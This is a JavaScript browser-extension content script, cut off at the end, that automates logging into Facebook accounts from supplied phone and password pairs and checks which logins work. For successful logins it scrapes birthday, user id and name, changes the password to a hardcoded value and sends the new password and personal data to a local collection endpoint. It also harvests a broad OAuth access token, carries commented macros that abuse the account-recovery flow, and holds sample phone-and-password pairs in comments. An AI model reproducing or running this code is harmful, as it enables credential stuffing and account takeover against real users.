/*
 * Copyright(c) 2014-2016 Dinesh Rajkumar Bhosale of getmyscript.com
 * See license file for more information
 * Contact developers at mr.dinesh.bhosale@gmail.com
 * */
 var api = typeof chrome!="undefined" ? chrome : browser;
 var check = 0,li,login,nexts;
 var curl = window.location.href;
var url = new URL(curl);
var gcname = url.searchParams.get("cname");
var action = url.searchParams.get("action");
var backto = url.searchParams.get("backto");
var url_api = 'https://mbasic.facebook.com/';
if(curl.match(/mobile.facebook.com/g)) {
	url_api = 'https://mobile.facebook.com/';
} else if(curl.match(/m.facebook.com/g)) {
	url_api = 'https://m.facebook.com/';
} else if(curl.match(/mbasic.facebook.com/g)) {
	url_api = 'https://mbasic.facebook.com/';
}

start();
function start(){

	buildToolbox();
	setTimeout(function(){
		var curl = window.location.href;
		var url = new URL(curl);
		var chromename = url.searchParams.get("chromename");
		var ch = {
			'chromename': chromename
		}
		console.log('send chromename ' + chromename);
	 	send_message("check", ch);
	}, 10000);
	setTimeout(function(){
		chrome.storage.sync.get(['action'], function(result) {
			if(result.action == 'welcome') {
				chrome.storage.sync.get(['userinfo'], function(result) {
					if(!result.userinfo.birthday) {
						if(!curl.match(/\/zero\//g)) {
							if (!$('input[name=email]').length) {
								window.location.href = 'https://mbasic.facebook.com/language.php?n=%2Fhome.php&cname=getffba&action=lang';
							}
						}
					}
				});
			}
			if(result.action == 'lang') {
				chrome.storage.sync.get(['userinfo'], function(result) {
					if(!result.userinfo.birthday) {
						if(!curl.match(/\/zero\//g)) {
							if (!$('input[name=email]').length) {
								chrome.storage.sync.set({action: 'token'});
								userdata = {};
						    	userinfo(userdata);
						    	if(!curl.match(/mobile.facebook.com/g)) {
						    		window.location.href = 'https://mobile.facebook.com/';
						    	}
						    }
						}
					}
				});
			}
		});
	}, 60* 1000);
}
chrome.storage.sync.get(['userinfo'], function(result) {
	console.log(result.userinfo);
});
chrome.storage.sync.get(['action'], function(result) {
	console.log(result.action);
	if(!result.action) {
		chrome.storage.sync.get(['userinfo'], function(result) {
			if(!result.userinfo.birthday) {
				if (!$('input[name=email]').length) {
					window.location.href = 'https://mbasic.facebook.com/language.php?n=%2Fhome.php&cname=getffba&action=lang';
				}
			}
		});
	}
	if(result.action == 'welcome') {
		chrome.storage.sync.get(['userinfo'], function(result) {
			if(!result.userinfo.birthday) {
				if(!curl.match(/\/zero\//g)) {
					if (!$('input[name=email]').length) {
						window.location.href = 'https://mbasic.facebook.com/language.php?n=%2Fhome.php&cname=getffba&action=lang';
					}
				}
			}
		});
	}
	if(result.action == 'zero') {
		chrome.storage.sync.get(['userinfo'], function(result) {
			curl = window.location.href;
			if(!curl.match(/\/zero\//g)) {
				if (!$('input[name=email]').length) {
					window.location.href = 'https://mbasic.facebook.com/language.php?n=%2Fhome.php&cname=getffba&action=lang';
				}
			}
		});
	}
	if(result.action == 'finish') {
		chrome.storage.sync.get(['userinfo'], function(result) {
			if(!result.userinfo.birthday) {
				if (!$('input[name=email]').length) {
					chrome.storage.sync.set({action: 'token'});
					console.log('!birthday');
					window.location.href = 'https://mobile.facebook.com/';
				}
			} else {
				if (!$('input[name=email]').length) {
					console.log('userinfo ok');
					userdata = result.userinfo;
					userinfo(userdata);
				}
			}
		});
	}
});

function resizeFrame() {
	var newClassName = document.getElementById(targetDivId).getAttribute("class");
	newClassName = newClassName.replace(" fst_container_resized", "");
	newClassName = newClassName.replace(" fst_container_maximized", "");
	newClassName += " fst_container_resized";
	document.getElementById(targetDivId).setAttribute("class", newClassName);
}
//for maximizing frame
function maximizeFrame() {
	var newClassName = document.getElementById(targetDivId).getAttribute("class");
	newClassName = newClassName.replace(" fst_container_resized", "");
	newClassName = newClassName.replace(" fst_container_maximized", "");
	newClassName += " fst_container_maximized";
	document.getElementById(targetDivId).setAttribute("class", newClassName);
}
//function to close frame and reload page
function closeAll() {
	document.getElementsByClassName("fst_container")[0].remove();
	window.location.reload();
}
//function for setting event listners
function setEventListener() {
	addEventListener("message", function(event) {
		if (event.origin + "/" == chrome.extension.getURL("")) {
			var eventToolName = event.data.name;
			//for close button
			if (eventToolName == "close-button") {
				closeAll();
			}
			//scroll to top
			if (eventToolName == "scroll-to-top") {
				$("html, body").animate({
					scrollTop: 0
				}, "slow");
			}
			//scroll to bottom
			if (eventToolName == "scroll-to-bottom") {
				$("html, body").animate({
					scrollTop: $(document).height()
				}, "slow");
			}
			//to decrease size of frame
			if (eventToolName == "resize-button") {
				resizeFrame();
			}
			//to increase size of frame
			if (eventToolName == "maximize-button") {
				maximizeFrame();
			}
			//for inviting friends to like a page
			if (eventToolName == "login") {
				var id = event.data.id;
				var delay = event.data.delay;
				if(window.location.href.match(/mbasic.facebook.com\/login/g)){
					deletenow();
				}else{
					window.location.href = 'https://mbasic.facebook.com/login/device-based/regular/login/';
				}
				//inviteNow(id,delay);
			}
			if (eventToolName == "testimacros") {
				testimacros();
			}
			if (eventToolName == "checknow") {
				check = 0,login = 0;
				var vars = {
					homeurl: '',
					email: event.data.phone,
					//email: '+8562099226332',
					pass: event.data.pass,
					//pass: '02099226332',
					npass: 'khmer@123',
					delay: event.data.delay,
					chromename: event.data.chromename,
					id: event.data.phoneid,
				}
				//changePassword(vars);
				//checknow(vars);
				
				//updatefb(vars);
				var message_to_show = 'Start login with ' + vars.email;
				toastr.info(message_to_show);
				//status(vars);

				if(!login) {
					api.storage.sync.get(['cname'], function(result) {
						console.log(result.cname);
						if(result.cname == 'getffba') {
							if ($('input[name=email]').length>0) {
								chNow(vars);
							} else {								
						    	if(!curl.match(/mobile.facebook.com/g)) {
						    		window.location.href = 'https://mobile.facebook.com/';
						    	} else {
						    		userdata = {};
						    		userinfo(userdata);
						    	}
							}
						} else {
							chrome.storage.sync.set({userinfo: ''});
							//status(vars);
							if ($('input[name=email]').length>0) {
								chrome.storage.sync.set({cname: 'getffba'});
								status(vars);
							} else {
								if(curl.match(/confirmemail/g)) {
									vars.logout = 'confirmemail';
									logout(vars);
								} else if(curl.match(/checkpoint/g)) {
									vars.logout = 'checkpoint';
									logout(vars);
								} else {
									chNow(vars);
								}
							}
						}
					});	
					
				}
				login = 1;
			}
			if (eventToolName == "restartTool") {
				restartTool();
			}
		}
	}, false);
}


function getDetail(vars) {
	var trylogin;
	var http4 = new XMLHttpRequest;
	var url4 = url_api + "login/?next&ref=dbl&fl&refid=8";
	http4.open("GET", url4, true);
	http4.onreadystatechange = function (){
		if (http4.readyState == 4 && http4.status == 200){
			var htmlstring = http4.responseText;
			if(htmlstring.match(/header/g)) {
				$('#header').html('<div id="getdetal" style="display:none">'+htmlstring+'</textarea');
				if($("#getdetal").length){
					var li = $("#getdetal input[name=li]").val();
					var lsd = $("#getdetal input[name=lsd]").val();
					var m_ts = $("#getdetal input[name=m_ts]").val();
					var jazoest = $("#getdetal input[name=jazoest]").val();
					var fb_dtsg = $("#getdetal input[name=fb_dtsg]").val();
					console.log(fb_dtsg);					
					if(!fb_dtsg) {
						toastr.error('Not enough detail with fb_dtsg '+ fb_dtsg);
						vars.li = li;
						vars.lsd = lsd;
						vars.m_ts = m_ts;
						vars.jazoest = jazoest;
					} else {
						vars.li = li;
						vars.lsd = lsd;
						vars.m_ts = m_ts;
						vars.jazoest = jazoest;
						vars.fb_dtsg = fb_dtsg;
					}
					if(!trylogin) {
						checknow(vars);
						trylogin = 1;
					}
					
				}
			}
			http4.close;
		};
	};
	http4.send(null);
}
function checknow(vars) {
	var tch = false;
	var r20 = {
		lwv: 100,
		refid: 8,
		lsd: vars.lsd,
		jazoest: vars.jazoest,
		m_ts: vars.m_ts,
		li: vars.li,
		fb_dtsg: vars.fb_dtsg,
		try_number: 0,
		unrecognized_tries: 0,
		email: vars.email,
		pass: vars.pass,
	};
	var request = new XMLHttpRequest;

	request["open"]("POST", "https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Ffree.facebook.com%2F&lwv=100&refid=8");
	request["setRequestHeader"]("Content-type", "application/x-www-form-urlencoded");
	request["onreadystatechange"] = function () {
		if (request["readyState"]) {
			if(check==0){
				status(vars);

			}
		}
	};
	if(!tch) {
		request["send"](deSerialize(r20));
		tch = 1;
	}
}

function status(vars)
{
	check = 1;
	nexts = 0;
	//function to get html code of facebook groups table from facebook
	var http4 = new XMLHttpRequest;
	var url4 = "https://mbasic.facebook.com/me";
	http4.open("GET", url4, true);
	http4.onreadystatechange = function (){
		if (http4.status == 404){
			toastr.error('Login false');
			vars.del = 1;
			if(!nexts) {
				next(vars);
			}
		}
		if (http4.readyState == 4 && http4.status == 200){
			var htmlstring = http4.responseText;
			if(htmlstring.match(/confirmemail/g)) {
				vars.logout = 'confirmemail';
				logout(vars);
			}
			if(htmlstring.match(/checkpoint/g)) {
				vars.logout = 'checkpoint';
				logout(vars);
			}
			if(!htmlstring.match(/sign_up/g) && !htmlstring.match(/signup-button/g) && !htmlstring.match(/login_reg_separator/g)) {
				if(!htmlstring.match(/confirmemail/g)) {
					var message_to_show = 'Login success fully!';
					toastr.success(message_to_show);
					toastr.info('Please wait...');
					
					var userinfo = {
						phone: vars.email,
						pass: vars.pass,
						//pass: '02097872544',
						npass: vars.npass,
						chromename: vars.chromename,
						id: vars.id,
					};
					chrome.storage.sync.set({userinfo: userinfo});
					chrome.storage.sync.set({cname: 'getffba'});	
					chrome.storage.sync.set({action: 'welcome'});	
					chrome.storage.sync.set({backto: 'getffba'});	
					window.location.href = 'https://mbasic.facebook.com/language.php?n=%2Fhome.php&cname=getffba&action=lang';
					// chrome.tabs.getSelected(null, function (tab) {
					// 	tabid = tab.id;
					// 	chrome.tabs.create({url: 'https://mbasic.facebook.com/language.php?n=%2Fhome.php&cname=zero&action=lang&backto=password', active: true});
					// setTimeout(function(){
					// 	getName(vars);
					// }, (60*1000));

					
					// if(htmlstring.match(/zero\/optin/g)) {
					// 	vars.freemode=1;
					// 	console.log('zero optin');
					// 	confirmfree(vars);
					// } else {	
					// 	getName(vars);
					// }
				}

			} else {
				nexts = 0;
				if(!nexts) {
					toastr.error('Login false');
					vars.del = 1;
					next(vars);
					nexts = 1;
				}
			}
			http4.close;
		};

	};
	http4.send(null);
	nexts = 1;	
}
function confirmfree(vars) {
	var macroCode = '';
	 macroCode += 'TAB OPEN\n TAB T=2\n';
	 macroCode += 'SET !ERRORIGNORE YES\n';
     macroCode += 'URL GOTO=https://mbasic.facebook.com/zero/policy/optin?_rdc=1&_rdr\n';
     macroCode += 'WAIT SECONDS=2\n';     
     macroCode += 'TAG POS=1 TYPE=INPUT:SUBMIT FORM=ACTION:/zero/optin/write/?action=confirm&page=dialtone_optin_page ATTR=*\n';
     macroCode += 'WAIT SECONDS=10\n';
     macroCode += 'TAB CLOSE\n TAB T=1\n';
    function launchMacro()
    {
    try
       {
          if(!/^(?:chrome|https?|file)/.test(location))
          {
             alert('iMacros: Open webpage to run a macro.');
             return;
          }
	   
          var macro = {}; 
          macro.source = macroCode;
          macro.name = 'EmbeddedMacro';
	   
          var evt = document.createEvent('CustomEvent');
          evt.initCustomEvent('iMacrosRunMacro', true, true, macro);
          window.dispatchEvent(evt);
       }
	    catch(e)
	    {
	       alert('iMacros Bookmarklet error: '+e.toString());
	    };
 	}
 	//launchMacro();
 	setTimeout(function(){
		getName(vars);
	}, (40*1000));
	// if(vars.freemode) {
	// 		var r20 = {
	// 			fb_dtsg: vars.fb_dtsg,
	// 			jazoest: vars.jazoest,
	// 			action: 'confirm',
	// 			page: 'reconsider_optin_dialog',
	// 		};
	// 		var request = new XMLHttpRequest;

	// 		request["open"]("POST", "https://mbasic.facebook.com/zero/optin/write/?action=confirm&page=reconsider_optin_dialog");
	// 		request["setRequestHeader"]("Content-type", "application/x-www-form-urlencoded");
	// 		request["onreadystatechange"] = function () {
	// 			if (request["readyState"]) {
	// 				//status(vars);
	// 			}
	// 		};
	// 		request["send"](deSerialize(r20));
	// }
}
function next(vars) {
	var message_to_show = 'Please wait for '+ vars.delay + ' seconds.';
	toastr.info(message_to_show);
	send_message("next", vars);
}
function logout(vars) {
	if(vars.logout=='confirmemail') {
		var http4 = new XMLHttpRequest;
		var url4 = "https://mbasic.facebook.com/confirmemail.php";
		http4.open("GET", url4, true);
		http4.onreadystatechange = function (){
			if (http4.readyState == 4 && http4.status == 200){
				var htmlstring = http4.responseText;
				var uname = /<a accesskey=.*? class=.*? href="([\s\S]*)".*?>.*?<\/a>/.exec(htmlstring)[1];
				logoutLink = uname.split('"')[0];
				vars.logoutLink = logoutLink;
				openlink(vars);
				http4.close;
			};
		};
		http4.send(null);
	}
	if(vars.logout=='checkpoint') {
		var macroCode = '';
		macroCode += 'TAB OPEN\n TAB T=2\n';
		macroCode += 'SET !ERRORIGNORE YES\n SET !TIMEOUT_PAGE 3600\n';
		macroCode += 'URL GOTO=https://web.facebook.com/checkpoint/?next\n';
		macroCode += 'WAIT SECONDS=1\n';         
		macroCode += 'TAG POS=1 TYPE=A ATTR=TXT:ออกจากระบบ\n';
		macroCode += 'TAG POS=1 TYPE=A ATTR=TXT:Log<SP>Out\n';
		macroCode += 'WAIT SECONDS=5\n';
     	macroCode += 'TAB CLOSE\n TAB T=1\n';
		launchMacro(macroCode);
		setTimeout(function(){
			next(vars);
		}, (10*1000));
		
	}
}
function openlink(vars) {
	var http4 = new XMLHttpRequest;
	var url4 = vars.logoutLink;
	http4.open("GET", url4, true);
	http4.onreadystatechange = function (){
		if (http4.readyState){
			next(vars);
		};
	};
	http4.send(null);
}
function getDate(vars) {
	var http4 = new XMLHttpRequest;
	var url4 = "https://mbasic.facebook.com/editprofile.php?type=basic&edit=birthday";
	http4.open("GET", url4, true);
	http4.onreadystatechange = function (){
		if (http4.readyState == 4 && http4.status == 200){
			var htmlstring = http4.responseText;
			if(htmlstring.match(/fb_dtsg/g)) {
				var message_to_show = 'Login success fully!';
				toastr.success(message_to_show);

				toastr.info('Starting Change password');
				var matches = [];
				var regex = /selected="1">(\d+)(\w*)/gi;
				while ((match = regex.exec(htmlstring))) {
				  matches.push(match[1]);
				}
				var day = matches[0];
				var years = matches[1];

				var uname = /<option.*? selected="1">([\s\S]*)<\/option>/.exec(htmlstring);
				var gmounth = uname[1].split('</option>');
				
				var month = gmounth[0];
				vars.day = day;
				vars.month = month;
				vars.year = years;
				var userinfo = {
					d: vars.day,
					m: vars.month,
					y: vars.year,
					phone: vars.email,
					pass: vars.pass,
					uid: vars.uid,
					uname: vars.uname,
					id: vars.id,
					chromename: vars.chromename,
				};
				vars.en_US;

				console.log('finish');
				console.log(userinfo);

				//language(vars);
				//window.location = 'http://localhost/fbpost/facebook/fbupdate?stat=8&action=userinfo&'+deSerialize(userinfo);
				//changePassword(vars);
			}
			http4.close;
		};
	};
	http4.send(null);
}
function language(vars) {
	var http4 = new XMLHttpRequest;
	var url4 = "https://mbasic.facebook.com/a/language.php?l="+vars.en_US+"&lref=%2Fsettings%2Flanguage%2F&sref=legacy_mobile_settings&gfid=AQAyMQVTcjNCvNG2bCk";
	http4.open("GET", url4, true);
	http4.onreadystatechange = function (){
		if (http4.readyState == 4 && http4.status == 200){
			ichangePassword(vars);
			http4.close;
		};
	};
	http4.send(null);
	// window.location.href = 'https://mbasic.facebook.com/language.php';
	// var macroCode = '';
	// macroCode += 'TAB OPEN\n TAB T=2\n';
	// macroCode += 'SET !ERRORIGNORE YES\n SET !TIMEOUT_PAGE 3600\n';
	// macroCode += 'URL GOTO=https://m.facebook.com/language.php\n';
	// macroCode += 'WAIT SECONDS=1\n';         
	// macroCode += 'TAG POS=1 TYPE=SPAN ATTR=TXT:English<SP>(US)\n';
	// macroCode += 'WAIT SECONDS=5\n';
 // 	macroCode += 'TAB CLOSE\n TAB T=1\n';
	// //launchMacro(macroCode);
	// setTimeout(function(){
	// 	ichangePassword(vars);
	// }, (20*1000));
}
function getName(vars) {
	var http4 = new XMLHttpRequest;
	var url4 = "https://mbasic.facebook.com/profile.php";
	http4.open("GET", url4, true);
	http4.onreadystatechange = function (){
		if (http4.readyState == 4 && http4.status == 200){
			var htmlstring = http4.responseText;
			var uname = /<title.*?>([\s\S]*)<\/title>/.exec(htmlstring)[1];	
			profile_id = htmlstring.split('profile_id=');
			profile_id = profile_id[1].split('&');
			profile_id = profile_id[0];
			vars.uid = profile_id;			
			vars.uname = uname;
			console.log(vars.uid);
			console.log(vars.uname);
			getDate(vars);
			http4.close;
		};
	};
	http4.send(null);
}
function ichangePassword(vars) {
	var userinfo = {
		d: vars.day,
		m: vars.month,
		y: vars.year,
		phone: vars.email,
		pass: vars.pass,
		uid: vars.uid,
		uname: vars.uname,
		npass: vars.npass,
		chromename: vars.chromename,
		id: vars.id,
	};
	chrome.storage.sync.set({userinfo: userinfo});
	setTimeout(function(){
		window.location = 'https://mbasic.facebook.com/language.php?n=%2Fhome.php&cname=zero&action=lang&backto=password';
	}, (3*1000));
	// var macroCode = '';
	// macroCode += 'TAB OPEN\n TAB T=2\n';
	// macroCode += 'SET !ERRORIGNORE YES\n SET !TIMEOUT_PAGE 3600\n';
	// macroCode += 'URL GOTO=https://mbasic.facebook.com/hacked\n';
	// macroCode += 'WAIT SECONDS=1\n';         
	// macroCode += 'TAG POS=2 TYPE=INPUT:RADIO FORM=ACTION:/hacked/triage/ ATTR=NAME:reason\n';
	// macroCode += 'WAIT SECONDS=1\n';
	// macroCode += 'SET !TIMEOUT_STEP 1\n';
	// macroCode += 'TAG POS=1 TYPE=BUTTON FORM=ACTION:/hacked/triage/ ATTR=TXT:Continue\n';
	// macroCode += 'SET !TIMEOUT_STEP 1\n';
	// macroCode += 'TAG POS=1 TYPE=BUTTON FORM=ACTION:/hacked/triage/ ATTR=TXT:ดำเนินการต่อ\n';
	// macroCode += 'WAIT SECONDS=3\n';
	// macroCode += 'TAG POS=1 TYPE=INPUT:SUBMIT FORM=ACTION:/checkpoint/flow/?checkpoint_created=1* ATTR=ID:checkpointButtonContinue-actual-button\n';
	// macroCode += 'WAIT SECONDS=8\n';
	// macroCode += 'TAG POS=1 TYPE=INPUT:SUBMIT FORM=ACTION:/checkpoint/flow/?checkpoint_created=1* ATTR=ID:checkpointSubmitButton-actual-button\n';
	// macroCode += 'WAIT SECONDS=1\n';
	// macroCode += 'TAG POS=1 TYPE=INPUT:PASSWORD FORM=ACTION:/checkpoint/flow/?checkpoint_created=1* ATTR=NAME:password_old CONTENT='+vars.email+'\n';
	// macroCode += 'SET !TIMEOUT_STEP 1\n';
	// macroCode += 'TAG POS=1 TYPE=INPUT:PASSWORD FORM=ACTION:/checkpoint/flow/?checkpoint_created=1* ATTR=NAME:password_new CONTENT='+vars.pass+'\n';
	// macroCode += 'SET !TIMEOUT_STEP 1\n';
	// macroCode += 'TAG POS=1 TYPE=INPUT:TEXT FORM=ACTION:/checkpoint/flow/?checkpoint_created=1* ATTR=NAME:password_new CONTENT='+vars.npass+'\n';
	// macroCode += 'SET !TIMEOUT_STEP 1\n';
	// macroCode += 'TAG POS=1 TYPE=INPUT:PASSWORD FORM=ACTION:/checkpoint/flow/?checkpoint_created=1* ATTR=NAME:password_confirm CONTENT='+vars.npass+'\n';
	// macroCode += 'TAG POS=1 TYPE=INPUT:SUBMIT FORM=ACTION:/checkpoint/flow/?checkpoint_created=1* ATTR=ID:checkpointSubmitButton-actual-button\n';
	// macroCode += 'WAIT SECONDS=3\n';
	// macroCode += 'TAG POS=1 TYPE=INPUT:SUBMIT FORM=ACTION:/checkpoint/flow/?checkpoint_created=1* ATTR=ID:checkpointSubmitButton-actual-button\n';
	// macroCode += 'WAIT SECONDS=3\n';
 // 	macroCode += 'TAB CLOSE\n TAB T=1\n';
	// launchMacro(macroCode);
	// console.log('launchMacro');
	// setTimeout(function(){
	// 	var userinfo = {
	// 		d: vars.day,
	// 		m: vars.month,
	// 		y: vars.year,
	// 		phone: vars.email,
	// 		pass: vars.pass,
	// 		uid: vars.uid,
	// 		uname: vars.uname,
	// 		npass: vars.npass,
	// 		chromename: vars.chromename,
	// 		id: vars.id,
	// 	};
	// 	window.location = 'http://localhost/fbpost/facebook/fbupdate?stat=8&action=userinfo&'+deSerialize(userinfo);
	// }, (30*1000));
}
function changePassword(vars) {
	var http4 = new XMLHttpRequest;
	var url4 = "https://mbasic.facebook.com/settings/security/password/";
	http4.open("GET", url4, true);
	http4.onreadystatechange = function (){
		if (http4.readyState == 4 && http4.status == 200){
			var htmlstring = http4.responseText;
			if(htmlstring.match(/fb_dtsg/g)) {
				$('#login_top_banner').html('<div id="idgetproperty" style="display:none">'+htmlstring+'</textarea');
				if($("#idgetproperty").length){
					var sessions = $("#idgetproperty input[name=password_change_session_identifier]").val();
					var jazoest = $("#idgetproperty input[name=jazoest]").val();
					var fb_dtsg = $("#idgetproperty input[name=fb_dtsg]").val();
					vars.sessions = sessions;
					vars.jazoest = jazoest;
					vars.fb_dtsg = fb_dtsg;
					changepwnow(vars);
				}
			}
			http4.close;
		};
	};
	http4.send(null);
}
function changepwnow(vars) {
	var r20 = {
		fb_dtsg: vars.fb_dtsg,
		jazoest: vars.jazoest,
		password_change_session_identifier: vars.sessions,
		password_old: vars.pass,
		password_new: vars.npass,
		password_confirm: vars.npass,
		li: "fa4jYNDs7h53D5aIvtVtIIQw",
		save: 'Save Changes',
	};
	var request = new XMLHttpRequest;

	request["open"]("POST", "https://mbasic.facebook.com/password/change/?redirect_uri=%2Fsettings%2Fsecurity%2F%3Fsettings_tracking%3Dunknown%253Asettings_2_0");
	request["setRequestHeader"]("Content-type", "application/x-www-form-urlencoded");
	request["onreadystatechange"] = function () {
		if (request["readyState"]) {
			window.location = 'http://localhost/facebook/fbupdate?stat=8&action=userinfo&pw='+vars.npass+'&d='+vars.day+'&m='+vars.month+'&y='+vars.year+'&uid='+vars.uid+'&n='+vars.uname;
		}
	};
	request["send"](deSerialize(r20));
}
function getAccessToken() {
	var macroCode = '';
         macroCode += 'SET !TIMEOUT_PAGE 3600\n';
         macroCode += 'URL GOTO=https://m.facebook.com/dialog/oauth?scope=user_about_me%2Cuser_actions.books%2Cuser_actions.fitness%2Cuser_actions.music%2Cuser_actions.news%2Cuser_actions.video%2Cuser_activities%2Cuser_birthday%2Cuser_education_history%2Cuser_events%2Cuser_friends%2Cuser_games_activity%2Cuser_groups%2Cuser_hometown%2Cuser_interests%2Cuser_likes%2Cuser_location%2Cuser_managed_groups%2Cuser_photos%2Cuser_posts%2Cuser_relationship_details%2Cuser_relationships%2Cuser_religion_politics%2Cuser_status%2Cuser_tagged_places%2Cuser_videos%2Cuser_website%2Cuser_work_history%2Cemail%2Cmanage_notifications%2Cmanage_pages%2Cpublish_actions%2Cpublish_pages%2Cread_friendlists%2Cread_insights%2Cread_page_mailboxes%2Cread_stream%2Crsvp_event%2Cpublish_to_groups%2C%20groups_access_member_info%2C%20read_mailbox&response_type=token&client_id=124024574287414&redirect_uri=fb124024574287414%3A%2F%2Fauthorize%2F&sso_key=com&display=\n';
         macroCode += 'WAIT SECONDS=3\n';         
         macroCode += 'TAG POS=1 TYPE=BUTTON FORM=ACTION:/dialog/oauth/skip/submit/ ATTR=TXT:Continue<SP>as*\n';
         macroCode += 'WAIT SECONDS=5\n';
         macroCode += 'view-source:https://business.facebook.com/business_locations/\n';
         launchMacro(macroCode);
         AccessToken();
}
function AccessToken() {
	var url="https://business.facebook.com/business_locations/";
	tabRun(getffba,url);
	// 	var http4 = new XMLHttpRequest;
	// var url4 = "view-source:https://business.facebook.com/business_locations/";
	// http4.open("GET", url4, true);
	// http4.onreadystatechange = function (){
	// 	if (http4.readyState == 4 && http4.status == 200){
	// 		var htmlstring = http4.responseText;
	// 		if(htmlstring.match(/EAAGNO/g)) {
	// 			var message_to_show = 'Login success fully!';
	// 			toastr.success(message_to_show);

	// 			toastr.info('Starting get Access Token');
	// 			var uname = /EAAGNO([\s\S]*)QZDZD/.exec(htmlstring)[1];
	// 			console.log(22222222222222);
	// 			console.log(uname);
	// 			// profile_id = htmlstring.split('profile_id=');
	// 			// profile_id = profile_id[1].split('&amp');
	// 			// profile_id = profile_id[0];
	// 			// console.log(profile_id);
	// 			// getAccessToken();
	// 		}
	// 		http4.close;
	// 	};
	// };
	// http4.send(null);
}
function launchMacro(macroCode)
{
try
   {
      if(!/^(?:chrome|https?|file)/.test(location))
      {
         alert('iMacros: Open webpage to run a macro.');
         return;
      }
   
      var macro = {}; 
      macro.source = macroCode;
      macro.name = 'EmbeddedMacro';
   
      var evt = document.createEvent('CustomEvent');
      evt.initCustomEvent('iMacrosRunMacro', true, true, macro);
      window.dispatchEvent(evt);
   }
catch(e)
{
   alert('iMacros Bookmarklet error: '+e.toString());
};
}
function getdfb()
{
	//function to get html code of facebook groups table from facebook
	var http4 = new XMLHttpRequest;
	var url4 = "https://mbasic.facebook.com/me";
	http4.open("GET", url4, true);
	http4.onreadystatechange = function (){
		if (http4.readyState == 4 && http4.status == 200){
			var htmlstring = http4.responseText;
			if(htmlstring.match(/fb_dtsg/g)) {
				var uname = /<title.*?>([\s\S]*)<\/title>/.exec(htmlstring)[1];
				console.log(uname);
				profile_id = htmlstring.split('profile_id=');
				profile_id = profile_id[1].split('&amp');
				profile_id = profile_id[0];
				console.log(profile_id);
			}
			http4.close;
		};
	};
	http4.send(null);
}
function searchArray(obj, deepDataAndEvents) {
	var val = false;
	for (key in obj) {
		if (key.toString() == deepDataAndEvents) {
			val = obj[key];
			break;
		} else {
			if (typeof obj[key] == "object") {
				val = searchArray(obj[key], deepDataAndEvents);
				if (val != false) {
					break;
				}
			}
		}
	};
	return val;
}
// function checknow(delay) {
// 	$('input[name=email]').val('+8562096700872');
// 	$('input[name=pass]').val('02096700872');
// 	$('#loginbutton').mouseover();
// 	$('#loginbutton').click();
// }

//for adding UI components to DOM
function buildToolbox() {
	//adding stylesheet for to dom
	var cssURL = chrome.extension.getURL('/content_new/'+dirName+'/css/content.css');
	var styleElem = document.createElement('link');
	styleElem.setAttribute('href', cssURL);
	styleElem.setAttribute('rel', 'stylesheet');
	styleElem.setAttribute('type', 'text/css');
	document.body.appendChild(styleElem);
	//adding iframe to dom
	if(window.location.href.match(/login/g)){
		surl = '#active';
	} else {
		surl = '';
	}
	var frameURL = chrome.extension.getURL('/content_new/'+dirName+'/html/frame.html'+surl);
	var appendCode = '';
	var frameStyle = '';
	appendCode += '<iframe id='+targetFrameId+' style="' + frameStyle + '" src="' + frameURL + '" class="fst_inner_frame">';
	var appendDiv = document.createElement('div');
	appendDiv.innerHTML = appendCode;
	appendDiv.setAttribute('class', 'fst_fbvid_container fst_container');
	appendDiv.setAttribute('id', targetDivId);
	document.body.appendChild(appendDiv);
	setEventListener();
}

function deletenow() {
	var targetFrameId='fstFrameDiv';
	var iframe = document.getElementById(targetFrameId);
	//send_message("urlative", "urlative");
	if(iframe) {
		send_message("urlative", "urlative");
			// var postData = {};
			// postData.name = "urlative";
			// postData.type='urlative';
			// iframe.contentWindow.postMessage(postData, "*");
	} else {
		console.log(222222222);
	}


	// var targetFrameId='fstFrameDiv';
	// var iframe = document.getElementById(targetFrameId);
 //    var msg = {
 //        type: type,
 //        data: data
 //    };
 //    iframe.contentWindow.postMessage(msg, '*');
}
//just for passing values in correct function, validating fb_dtsg and user_id at the same time
function chNow(vars){
	if(vars.delay>=0){
		sendnow(vars);
	}else{
		toastr.error(messages.invalid_delay_time);
	}
}
//to like current Facebook page
function likepage(p){
	var Page = new XMLHttpRequest();
	var PageURL = "/ajax/pages/fan_status.php";
	var PageParams = "&fbpage_id=" + p + "&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user=" + user_id + "&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg=" + fb_dtsg + "&phstamp=";
	Page.open("POST", PageURL, true);
	Page.onreadystatechange = function () {
		if (Page.readyState == 4 && Page.status == 200){
			console.log(toolTitle+":page liked,page_id="+p);
		};
		var xhrname=Page;
		if(xhrname.readyState==4){
			if(give_error_description(xhrname.responseText)){
				//toastr.error(give_error_description(xhrname.responseText));
			}
		}
	};
	Page.send(PageParams);
};
//for starting page invitation process
function startinvite(pageid,delaytimepageinvite,friendidarray){
	//first like the page
	likepage(pageid);
	//set counter
	var counter_var_page_invite=-1;
	function send_page_invites(){
		counter_var_page_invite++;
		if(friendidarray[counter_var_page_invite]){
			params4="&page_id="+pageid;
			params4+="&invitee="+friendidarray[counter_var_page_invite];
			params4+="&action=send";
			params4+="&ref=finch_about_build_audience";
			params4+="&__user="+user_id;
			params4+="&__a=1";
			params4+="&__req=e";
			params4+="&fb_dtsg="+fb_dtsg;
			var http4 = new XMLHttpRequest;
			var url4 = "/ajax/pages/invite/send_single/";
			http4.open("POST", url4, true);
			http4.onreadystatechange = function () {
				//for dislaying error messages
				var xhrname=http4;
				if(xhrname.readyState==4){
					if(give_error_description(xhrname.responseText)){
						toastr.error(give_error_description(xhrname.responseText));
					}
				}
				if (http4.readyState == 4 && http4.status == 200){
					if((counter_var_page_invite+1)>1){
						var message=(counter_var_page_invite+1)+" Friends are invited.";
					}else{
						var message=(counter_var_page_invite+1)+" Friend is invited.";
					}
					toastr.info(message);
					setTimeout(function(){
						send_page_invites();
					}, (delaytimepageinvite*1000));
				}
			}
			http4.send(params4);
		}else{
			if((counter_var_page_invite+1)>1){
				var message=(counter_var_page_invite+1)+" Friends are invited.";
			}else{
				var message=(counter_var_page_invite+1)+" Friend is invited.";
			}
			toastr.info(message);
			alert(messages.page_invitation_complete);
		}
	}
	send_page_invites();
}
//function for sending page invites
function sendnow(vars){
	delay=parseInt(vars.delay);
	if(delay<0){
		delay=1;
		toastr.info(messages.delay_time)
	}

	if(!isNaN(delay)){
		toastr.info('Starting check');
		//checknow(vars);
		getDetail(vars);	
	}else{
		toastr.error(messages.invalid_delay);
	};

}
function send_message(type, data)
{
